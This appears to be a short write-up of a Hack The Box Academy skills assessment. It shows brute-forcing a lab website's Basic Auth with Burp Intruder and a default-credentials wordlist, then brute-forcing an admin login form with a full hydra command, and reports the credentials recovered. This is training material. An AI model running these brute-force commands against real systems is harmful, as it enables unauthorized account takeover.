# Skills Assessment Website  

[Skills Assessment Website](https://academy.hackthebox.com/module/57/section/515)  

>Target: `94.237.57.58:36713`  

>Website initial access is Basic Auth, and can Brute Force with Combined Wordlist.  

![skills assessment website](/images/skills-assessment-website.png)  

>Using Burp Suite intruder with a wordlist that combine the username and password on single line as single payload.

![skills-assessment website burp intruder](/images/skills-assessment-website-burp-intruder.png)  

>Credentials discovered using the wordlist: `/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt`

```
echo 'dXNlcjpwYXNzd29yZA==' | base64 -d;echo        
user:password
```

>Login Form Brute Force - Static User, and a Password Wordlist.  

>The HTML form name and web parameters from the login can be seen on Burp Suite Repeater request and response windows:  

![skills-assessment-website-burp-repeater](/images/skills-assessment-website-burp-repeater.png)  

```
hydra -L ../resources/demo-users.lst -P ../resources/demo-pass.lst -f 94.237.57.58 -s 36713 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'"
```  

>Web application login Credentials discovered using brute force: `user:harrypotter`  
